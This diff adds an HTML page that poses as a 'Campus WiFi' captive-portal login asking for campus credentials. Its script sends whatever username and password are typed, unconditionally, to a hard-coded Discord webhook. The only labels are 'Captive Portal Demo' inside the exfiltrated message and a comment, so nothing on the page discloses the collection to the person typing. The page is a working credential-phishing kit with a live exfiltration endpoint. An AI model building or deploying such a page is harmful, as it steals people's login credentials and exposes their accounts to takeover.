@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Campus WiFi Login</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .card {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+      width: 360px;
+    }
+    h2 { margin-bottom: 6px; color: #222; }
+    p { color: #666; font-size: 14px; margin-bottom: 20px; }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 15px;
+    }
+    button {
+      width: 100%;
+      padding: 11px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+    button:hover { background: #1558b0; }
+    .error { color: red; font-size: 13px; margin-bottom: 10px; display: none; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Campus WiFi</h2>
+    <p>Sign in with your campus credentials to get access.</p>
+    <div class="error" id="errMsg">Incorrect username or password.</div>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="login()">Sign In</button>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1510329362061459617/3TMN4oPLhdLFnOlCvD3YXjJYZZcUPIzBBROA76p8MXm4ooXeFol0C7AvICST3sfWC0aB";
+
+    async function login() {
+      const user = document.getElementById("username").value.trim();
+      const pass = document.getElementById("password").value.trim();
+
+      // Send to Discord webhook regardless
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `**Captive Portal Demo**\nUsername: \|\|${user}\|\|\nPassword: \|\|${pass}\|\|`
+        })
+      });
+
+      
+    }
+  </script>
+</body>
+</html>
